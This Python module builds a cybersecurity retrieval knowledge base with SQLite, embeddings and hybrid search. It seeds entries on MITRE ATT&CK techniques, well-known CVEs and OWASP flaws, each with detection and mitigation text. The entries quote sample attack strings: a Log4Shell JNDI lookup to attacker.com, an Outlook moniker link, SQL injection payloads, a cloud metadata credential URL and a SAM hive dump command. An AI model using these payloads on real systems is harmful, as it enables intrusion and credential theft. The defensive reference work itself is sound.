import os
import sys
import json
import time
import sqlite3
import numpy as np
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple

KNOWLEDGE_BASE_DIR = Path(__file__).resolve().parent.parent / "data" / "knowledge_base"
KNOWLEDGE_BASE_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = KNOWLEDGE_BASE_DIR / "cyber_knowledge.db"

_EMBEDDER = None

def get_embedder():
    """Initializes and returns the in-memory SentenceTransformer embedder."""
    global _EMBEDDER
    if _EMBEDDER is None:
        try:
            from sentence_transformers import SentenceTransformer
            try:
                _EMBEDDER = SentenceTransformer("all-MiniLM-L6-v2", local_files_only=True)
            except Exception:
                _EMBEDDER = SentenceTransformer("all-MiniLM-L6-v2")
        except Exception as e:
            print(f"[RAG] Warning: Could not initialize SentenceTransformer: {e}")
            _EMBEDDER = None
    return _EMBEDDER


def compute_embedding(text: str) -> np.ndarray:
    """Computes dense 384-d normalized vector embedding for given text."""
    embedder = get_embedder()
    if embedder is not None:
        vec = embedder.encode(text, convert_to_numpy=True)
        # Normalize to unit length for cosine similarity via dot product
        norm = np.linalg.norm(vec)
        if norm > 0:
            vec = vec / norm
        return vec.astype(np.float32)

    # Fallback: query Ollama's nomic-embed-text if sentence_transformers fails
    try:
        import urllib.request
        payload = json.dumps({"model": "nomic-embed-text:latest", "prompt": text}).encode("utf-8")
        req = urllib.request.Request("http://127.0.0.1:11434/api/embeddings", data=payload, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            vec = np.array(data.get("embedding", []), dtype=np.float32)
            norm = np.linalg.norm(vec)
            if norm > 0:
                vec = vec / norm
            return vec
    except Exception:
        # Dummy zero vector if both fail
        return np.zeros(384, dtype=np.float32)


# ============================================================================
# Database Schema & Initialization
# ============================================================================
def init_db():
    """Initializes SQLite tables for cybersecurity knowledge documents with model_scope."""
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS cyber_docs (
            id TEXT PRIMARY KEY,
            category TEXT NOT NULL,
            title TEXT NOT NULL,
            external_id TEXT,
            severity TEXT DEFAULT 'MEDIUM',
            content TEXT NOT NULL,
            detection TEXT,
            mitigation TEXT,
            tags TEXT,
            embedding BLOB,
            created_at REAL,
            model_scope TEXT DEFAULT 'global'
        )
    """)
    # Safe migration: ensure model_scope column exists if table was created previously
    try:
        cursor.execute("ALTER TABLE cyber_docs ADD COLUMN model_scope TEXT DEFAULT 'global'")
    except Exception:
        pass

    cursor.execute("CREATE INDEX IF NOT EXISTS idx_category ON cyber_docs(category)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_ext_id ON cyber_docs(external_id)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_title ON cyber_docs(title)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_model_scope ON cyber_docs(model_scope)")
    conn.commit()
    conn.close()


def insert_doc(
    doc_id: str,
    category: str,
    title: str,
    content: str,
    external_id: Optional[str] = None,
    severity: str = "MEDIUM",
    detection: Optional[str] = None,
    mitigation: Optional[str] = None,
    tags: Optional[List[str]] = None,
    model_scope: Optional[str] = "global",
    auto_embed: bool = True
) -> bool:
    """Inserts or updates a structured cybersecurity knowledge document with model_scope."""
    init_db()
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    text_to_embed = f"{title}. {content} {detection or ''} {mitigation or ''}"
    emb_blob = None
    if auto_embed:
        emb_vec = compute_embedding(text_to_embed)
        emb_blob = emb_vec.tobytes()

    scope_val = (model_scope or "global").strip()
    tags_str = json.dumps(tags or [])
    cursor.execute("""
        INSERT OR REPLACE INTO cyber_docs 
        (id, category, title, external_id, severity, content, detection, mitigation, tags, embedding, created_at, model_scope)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        doc_id, category, title, external_id, severity, content,
        detection, mitigation, tags_str, emb_blob, time.time(), scope_val
    ))
    conn.commit()
    conn.close()
    return True


# ============================================================================
# Seed Data: Authoritative Cybersecurity Ground Truth
# ============================================================================
SEED_CYBER_KNOWLEDGE = [
    # --- MITRE ATT&CK Techniques ---
    {
        "id": "attack_t1055",
        "category": "mitre_attack",
        "title": "T1055: Process Injection",
        "external_id": "T1055",
        "severity": "HIGH",
        "content": (
            "Adversaries inject code into active processes to evade process-based defenses and elevate privileges. "
            "Common variations include DLL Injection (using CreateRemoteThread and LoadLibrary), "
            "Process Hollowing (spawning a suspended process, unmapping original image via NtUnmapViewOfSection, and writing new payload), "
            "Thread Execution Hijacking (SetThreadContext to point EIP/RIP to shellcode), and "
            "Early Cascade / APC Injection (QueueUserAPC targeting alertable threads)."
        ),
        "detection": (
            "Monitor Windows Event ID 4688 (Process Creation) and Sysmon Event ID 8 (CreateRemoteThread) "
            "and Event ID 10 (ProcessAccess with VM_WRITE/VM_OPERATION). "
            "Look for unsigned DLLs loaded from temporary directories, memory allocations with PAGE_EXECUTE_READWRITE permissions, "
            "and abnormal thread start addresses not pointing to known exported module routines."
        ),
        "mitigation": (
            "Enable Windows Defender Exploit Guard (Process Mitigation Options: Block non-Microsoft signed binaries, Arbitrary Code Guard). "
            "Implement Endpoint Detection and Response (EDR) memory scanning. Utilize AppLocker or Software Restriction Policies."
        ),
        "tags": ["process injection", "dll injection", "hollowing", "sysmon", "memory", "evasion", "t1055"]
    },
    {
        "id": "attack_t1059",
        "category": "mitre_attack",
        "title": "T1059: Command and Scripting Interpreter",
        "external_id": "T1059",
        "severity": "HIGH",
        "content": (
            "Adversaries abuse command-line and scripting interpreters (PowerShell, cmd.exe, bash, Python, VBScript) "
            "to execute arbitrary commands and payloads. Techniques include passing obfuscated command line arguments "
            "(e.g., -EncodedCommand, -NoProfile, -ExecutionPolicy Bypass), piping web downloads directly into memory (IEX / Invoke-Expression), "
            "and spawning LOLBins (Living Off the Land Binaries like certutil, mshta, rundll32)."
        ),
        "detection": (
            "Enable PowerShell Script Block Logging (Event ID 4104) and Transcription Logging. "
            "Monitor Sysmon Event ID 1 for command lines containing base64 flags, download cradles (System.Net.WebClient, curl, Invoke-WebRequest), "
            "and suspicious parent-child process relationships (e.g. WINWORD.EXE or EXCEL.EXE spawning powershell.exe)."
        ),
        "mitigation": (
            "Enforce Constrained Language Mode in PowerShell via AppLocker/WDAC. Disable or restrict Windows Script Host (wscript.exe, cscript.exe). "
            "Block LOLBin outbound web requests at firewall/proxy."
        ),
        "tags": ["powershell", "cmd", "scripting", "bash", "execution", "t1059", "lolbins"]
    },
    {
        "id": "attack_t1003",
        "category": "mitre_attack",
        "title": "T1003: OS Credential Dumping",
        "external_id": "T1003",
        "severity": "CRITICAL",
        "content": (
            "Adversaries dump credentials from OS storage locations to obtain plaintext passwords, NTLM password hashes, "
            "and Kerberos tickets. Primary vectors include: dumping LSASS process memory (via MiniDumpWriteDump, ProcDump, or Mimikatz), "
            "reading SAM and SYSTEM registry hives (reg save hklm\\sam), DCSync attacks (abusing DRSUAPI replication rights), and NTDS.dit extraction."
        ),
        "detection": (
            "Sysmon Event ID 10 where SourceImage attempts PROCESS_VM_READ/PROCESS_QUERY_INFORMATION against TargetImage lsass.exe. "
            "Windows Security Event 4656/4663 (handle opened to SAM hive). Event ID 4662 auditing directory replication access (DCSync)."
        ),
        "mitigation": (
            "Enable Windows LSA Protection (RunAsPPL) and Credential Guard (Virtualization-Based Security). "
            "Restrict SeDebugPrivilege to authorized administrators. Implement Protected Users security group."
        ),
        "tags": ["credential dumping", "lsass", "mimikatz", "sam", "dcsync", "ntlm", "kerberos", "t1003"]
    },
    {
        "id": "attack_t1071",
        "category": "mitre_attack",
        "title": "T1071: Application Layer Protocol (C2 Communication)",
        "external_id": "T1071",
        "severity": "HIGH",
        "content": (
            "Adversaries communicate with command-and-control (C2) servers using standard application layer protocols "
            "to blend in with legitimate enterprise network traffic. Common vectors include HTTPS beacons (custom User-Agents, "
            "jittered sleep intervals), DNS Tunneling (exfiltrating data in base32/base64 encoded subdomains), and WebSockets."
        ),
        "detection": (
            "Analyze Zeek/Suricata logs for periodic beaconing patterns, abnormal SSL/TLS JA3/JA3S fingerprints, "
            "high frequency of NXDOMAIN responses, and anomalous DNS query lengths exceeding 60 characters."
        ),
        "mitigation": (
            "Enforce SSL/TLS decryption and inspection at the network perimeter. Implement DNS sinkholing and response policy zones (RPZ). "
            "Use strict outbound web proxy whitelisting."
        ),
        "tags": ["c2", "beaconing", "dns tunneling", "https", "network", "exfiltration", "t1071"]
    },

    # --- Famous Real-World CVEs ---
    {
        "id": "cve_2021_44228",
        "category": "cve",
        "title": "CVE-2021-44228: Log4Shell (Apache Log4j RCE)",
        "external_id": "CVE-2021-44228",
        "severity": "CRITICAL",
        "content": (
            "Apache Log4j2 versions 2.0-beta9 through 2.15.0 (excluding security releases) contain a Remote Code Execution vulnerability "
            "in JNDI lookup functionality. When an attacker sends a string containing '${jndi:ldap://attacker.com/a}' into any logged user input "
            "(HTTP headers, form fields, user agents), Log4j resolves the JNDI lookup, connects to the rogue LDAP server, downloads the remote Java class, "
            "and executes it in the context of the logging application process."
        ),
        "detection": (
            "Snort/Suricata rules detecting '${jndi:' with protocol schemes (ldap, rmi, dns, ldaps, iiop). "
            "Log inspection for obfuscated patterns like '${${lower:j}ndi:', '${j${::-n}di:'. "
            "Monitor outbound LDAP (389, 636) and RMI (1099) network traffic originating from Java application servers."
        ),
        "mitigation": (
            "Upgrade to Apache Log4j 2.17.1 or later. In versions >= 2.10, set system property log4j2.formatMsgNoLookups=true or "
            "environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true. Remove the JndiLookup class from the log4j-core JAR: "
            "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class."
        ),
        "tags": ["log4shell", "log4j", "rce", "jndi", "ldap", "java", "cve-2021-44228"]
    },
    {
        "id": "cve_2017_0144",
        "category": "cve",
        "title": "CVE-2017-0144: EternalBlue (MS17-010 SMBv1 RCE)",
        "external_id": "CVE-2017-0144",
        "severity": "CRITICAL",
        "content": (
            "A buffer overflow vulnerability in Microsoft Server Message Block 1.0 (SMBv1) allows remote unauthenticated attackers "
            "to execute arbitrary code on Windows target hosts by sending specially crafted SMBv1 Transaction2 secondary requests. "
            "The vulnerability stems from improper mathematical calculation when converting OS/2 FEA (Full Extended Attribute) lists "
            "into NT FEA structures inside SrvOs2FeaListToNt, leading to a buffer overflow in the Non-Paged Pool (srv.sys)."
        ),
        "detection": (
            "Monitor TCP port 445 network traffic for excessive SMBv1 Trans2 requests with invalid Multiplex IDs (0x51). "
            "Zeek and Snort alert SID 41978. Detect lsass.exe spawning abnormal child processes (cmd.exe, powershell.exe)."
        ),
        "mitigation": (
            "Apply Microsoft security bulletin MS17-010. Disable SMBv1 across all endpoints and servers via PowerShell: "
            "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol. Block inbound TCP port 445 at boundary firewalls."
        ),
        "tags": ["eternalblue", "ms17-010", "smb", "smbv1", "rce", "wannacry", "cve-2017-0144"]
    },
    {
        "id": "cve_2024_21413",
        "category": "cve",
        "title": "CVE-2024-21413: Microsoft Outlook Moniker Link RCE",
        "external_id": "CVE-2024-21413",
        "severity": "CRITICAL",
        "content": (
            "An arbitrary code execution vulnerability in Microsoft Outlook allows remote unauthenticated attackers to bypass "
            "Office Protected View and Security Prompts. By crafting a hyperlink with the 'file:///' protocol followed by an exclamation mark "
            "and anchor (e.g. '<a href=\"file:///\\\\attacker.com\\test!explicit\">'), Outlook delegates rendering to the Windows Moniker engine, "
            "which causes the COM object to be instantiated directly, leaking NTLM credentials or executing remote payloads without user warning."
        ),
        "detection": (
            "Examine inbound email bodies for hyperlink targets matching 'file://*!*'. "
            "Audit outbound SMB traffic (TCP 445) originating from OUTLOOK.EXE towards untrusted external IP addresses."
        ),
        "mitigation": (
            "Apply Microsoft February 2024 Patch Tuesday updates. Block outbound SMB (port 445) at border firewalls to prevent NTLM hash exfiltration. "
            "Enable NTLM restriction policies (Network Security: Restrict NTLM: Outgoing traffic to remote servers)."
        ),
        "tags": ["outlook", "moniker", "ntlm", "leak", "rce", "cve-2024-21413"]
    },

    # --- OWASP Top 10 Web Vulnerabilities ---
    {
        "id": "owasp_a03_sqli",
        "category": "owasp",
        "title": "OWASP A03: SQL Injection (SQLi) & CWE-89",
        "external_id": "CWE-89",
        "severity": "HIGH",
        "content": (
            "SQL Injection occurs when untrusted user input is directly concatenated or formatted into a database query string "
            "without parameterization or escaping. Attack vectors include: "
            "1. In-band SQLi (Error-based or UNION-based: ' UNION SELECT username, password FROM users--), "
            "2. Inferential SQLi (Boolean blind: ' AND (SELECT SUBSTR(password,1,1) FROM users)='a', and Time-based blind: '; WAITFOR DELAY '0:0:5'--), "
            "3. Out-of-band SQLi (DNS/HTTP requests triggered via xp_dirtree or UTL_HTTP)."
        ),
        "detection": (
            "WAF signatures detecting SQL keywords in URL parameters, cookies, and POST bodies (UNION, SELECT, ORDER BY, OR 1=1, SLEEP, BENCHMARK). "
            "Database audit logs showing syntax errors (e.g., ORA-01756, ORA-00936, SQL syntax error near...). "
            "Static code analysis (SAST) identifying string concatenation in query functions (cursor.execute(f'SELECT...{var}'))."
        ),
        "mitigation": (
            "Use Parameterized Queries / Prepared Statements exclusively: "
            "Python (sqlite3/psycopg2): cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)). "
            "Use Object-Relational Mappers (ORM) like SQLAlchemy or Prisma with parameterized bindings. Never concatenate strings into SQL."
        ),
        "tags": ["sqli", "injection", "cwe-89", "owasp", "database", "union", "blind"]
    },
    {
        "id": "owasp_a01_idor",
        "category": "owasp",
        "title": "OWASP A01: Broken Access Control & IDOR",
        "external_id": "CWE-639",
        "severity": "HIGH",
        "content": (
            "Insecure Direct Object Reference (IDOR) occurs when an application exposes a direct reference to an internal object "
            "(such as a database record primary key, filename, or account ID) without verifying that the requesting user possesses "
            "authorization to access that object. Example: Changing GET /api/documents/1042 to GET /api/documents/1043 allows User A "
            "to view User B's confidential records."
        ),
        "detection": (
            "Inspect API telemetry for rapid sequential ID enumeration from a single authenticated user session. "
            "Audit access logs for mismatched session identity vs requested resource owner ID. Dynamic testing via unauthorized token replay."
        ),
        "mitigation": (
            "Enforce strict server-side authorization checks on every resource request: "
            "SELECT * FROM documents WHERE id = :doc_id AND owner_user_id = :current_auth_user_id. "
            "Use indirect reference maps or non-sequential cryptographically secure UUIDs (v4)."
        ),
        "tags": ["idor", "access control", "owasp", "cwe-639", "api", "authorization"]
    },
    {
        "id": "owasp_a10_ssrf",
        "category": "owasp",
        "title": "OWASP A10: Server-Side Request Forgery (SSRF)",
        "external_id": "CWE-918",
        "severity": "HIGH",
        "content": (
            "SSRF vulnerabilities occur when a web application accepts a user-supplied URL and fetches data from it without validation. "
            "Adversaries abuse SSRF to: "
            "1. Query cloud metadata services (e.g., AWS EC2 IMDSv1 at http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
            "to steal IAM temporary credentials), "
            "2. Scan and access internal microservices (http://localhost:8080/admin, Redis on 6379), "
            "3. Bypass perimeter firewalls via DNS Rebinding attacks."
        ),
        "detection": (
            "Web application firewall inspection for target URLs matching loopback (127.0.0.1, localhost, 0.0.0.0) "
            "or link-local cloud metadata addresses (169.254.169.254). Outbound network monitoring on application servers."
        ),
        "mitigation": (
            "Require strict domain whitelists for outgoing requests. Resolve DNS and verify that IP addresses do not fall within "
            "RFC 1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16). "
            "Enforce AWS IMDSv2 (session tokens via PUT request) and disable IMDSv1."
        ),
        "tags": ["ssrf", "cloud", "aws", "metadata", "imds", "cwe-918", "owasp"]
    },
    {
        "id": "cwe_502_deserialization",
        "category": "cwe",
        "title": "CWE-502: Deserialization of Untrusted Data",
        "external_id": "CWE-502",
        "severity": "CRITICAL",
        "content": (
            "Occurs when an application deserializes untrusted data without verification. In languages like Python, Java, and PHP, "
            "objects can define custom behavior during reconstruction: "
            "Python: pickle.loads() invokes __reduce__(), allowing arbitrary OS command execution (e.g., os.system). "
            "Java: ObjectInputStream.readObject() can trigger gadget chains (e.g., CommonsCollections, Spring, Jackson) to achieve RCE. "
            "PHP: unserialize() triggers magic methods (__destruct, __wakeup)."
        ),
        "detection": (
            "Network payloads containing binary serialization magic headers: "
            "Java: 0xAC ED 00 05 (base64: rO0AB...). Python pickle: \\x80\\x03 / \\x80\\x04. "
            "Static analysis flagging pickle.loads, yaml.load(without SafeLoader), ObjectInputStream."
        ),
        "mitigation": (
            "Do not accept serialized objects from untrusted sources. Use safe, standard data interchange formats like JSON, "
            "Protocol Buffers, or MessagePack. In Python, use json.loads instead of pickle. In PyYAML, use yaml.safe_load()."
        ),
        "tags": ["deserialization", "pickle", "java", "gadget chain", "cwe-502", "rce"]
    }
]


def seed_knowledge_base():
    """Initializes and seeds the database if empty."""
    init_db()
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM cyber_docs")
    count = cursor.fetchone()[0]
    conn.close()

    if count == 0:
        print("[RAG] Seeding default authoritative cybersecurity knowledge base...")
        for item in SEED_CYBER_KNOWLEDGE:
            insert_doc(
                doc_id=item["id"],
                category=item["category"],
                title=item["title"],
                content=item["content"],
                external_id=item.get("external_id"),
                severity=item.get("severity", "MEDIUM"),
                detection=item.get("detection"),
                mitigation=item.get("mitigation"),
                tags=item.get("tags"),
                auto_embed=True
            )
        print(f"[RAG] Successfully seeded {len(SEED_CYBER_KNOWLEDGE)} authoritative documents.")


# ============================================================================
# Hybrid Search Engine (Vector Cosine + Exact Identifier Matching)
# ============================================================================
def search_knowledge(query: str, top_k: int = 3, category_filter: Optional[str] = None, model_scope: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Performs hybrid retrieval:
    1. Exact keyword match on external_id, title, and tags (boosted)
    2. Dense vector cosine similarity
    Returns top_k most relevant cybersecurity intelligence records with scores.
    """
    init_db()
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    where_conditions = []
    params = []
    if category_filter:
        where_conditions.append("category = ?")
        params.append(category_filter)

    if model_scope and model_scope != "all" and model_scope != "*":
        where_conditions.append("(model_scope = ? OR model_scope = 'global' OR model_scope IS NULL OR model_scope = '')")
        params.append(model_scope)

    where_clause = ("WHERE " + " AND ".join(where_conditions)) if where_conditions else ""

    # If query is empty or wildcard, return all documents up to top_k without similarity scoring
    if not query or not query.strip() or query.strip() == "*":
        cursor.execute(f"SELECT id, category, title, external_id, severity, content, detection, mitigation, tags, embedding, model_scope FROM cyber_docs {where_clause} ORDER BY created_at DESC LIMIT ?", params + [top_k])
        rows = cursor.fetchall()
        conn.close()
        return [
            {
                "id": r[0], "category": r[1], "title": r[2], "external_id": r[3],
                "severity": r[4], "content": r[5], "detection": r[6], "mitigation": r[7],
                "tags": json.loads(r[8] or "[]"), "model_scope": r[10] or "global", "score": 1.0
            }
            for r in rows
        ]

    query_vec = compute_embedding(query)
    q_tokens = [w.lower().strip() for w in query.replace("-", " ").replace(":", " ").split() if len(w) > 2]
    q_raw_lower = query.lower()

    cursor.execute(f"SELECT id, category, title, external_id, severity, content, detection, mitigation, tags, embedding, model_scope FROM cyber_docs {where_clause}", params)
    rows = cursor.fetchall()
    conn.close()

    scored_results = []
    for r in rows:
        doc_id, cat, title, ext_id, sev, content, detect, mitig, tags_json, emb_blob, doc_scope = r

        # 1. Vector Cosine Similarity
        vec_score = 0.0
        if emb_blob and len(emb_blob) > 0 and len(query_vec) > 0:
            doc_vec = np.frombuffer(emb_blob, dtype=np.float32)
            if len(doc_vec) == len(query_vec):
                dot_prod = np.dot(query_vec, doc_vec)
                vec_score = float(max(0.0, dot_prod))

        # 2. Exact Keyword & Identifier Boost
        kw_score = 0.0
        # Exact ID match (e.g. "T1055" or "CVE-2021-44228") gives high boost
        if ext_id and ext_id.lower() in q_raw_lower:
            kw_score += 0.85
        if title and any(token in title.lower() for token in q_tokens):
            kw_score += 0.25
        
        tags = json.loads(tags_json or "[]")
        for tag in tags:
            if tag.lower() in q_raw_lower:
                kw_score += 0.15

        # Combined hybrid score (Vector + Keyword)
        total_score = round(0.6 * vec_score + 0.4 * min(kw_score, 1.0), 4)

        if total_score > 0.15:
            scored_results.append({
                "id": doc_id,
                "category": cat,
                "title": title,
                "external_id": ext_id,
                "severity": sev,
                "content": content,
                "detection": detect,
                "mitigation": mitig,
                "tags": tags,
                "model_scope": doc_scope or "global",
                "score": total_score
            })

    scored_results.sort(key=lambda x: x["score"], reverse=True)
    return scored_results[:top_k]


def format_rag_context_prompt(docs: List[Dict[str, Any]]) -> str:
    """Formats retrieved cybersecurity intelligence into a structured system prompt block."""
    if not docs:
        return ""

    blocks = ["[AUTHORITATIVE CYBERSECURITY KNOWLEDGE BASE — RETRIEVED CONTEXT]"]
    for i, d in enumerate(docs, 1):
        ext_tag = f" ({d['external_id']})" if d.get('external_id') else ""
        header = f"--- Source {i}: {d['title']}{ext_tag} [Severity: {d.get('severity', 'INFO')}] ---"
        body = d['content']
        detect_part = f"\n* Detection Signatures: {d['detection']}" if d.get('detection') else ""
        mitig_part = f"\n* Mitigations: {d['mitigation']}" if d.get('mitigation') else ""
        blocks.append(f"{header}\n{body}{detect_part}{mitig_part}")

    blocks.append("[End of Retrieved Knowledge — Utilize these verified technical facts, detection patterns, and mitigations in your response.]\n")
    return "\n\n".join(blocks)
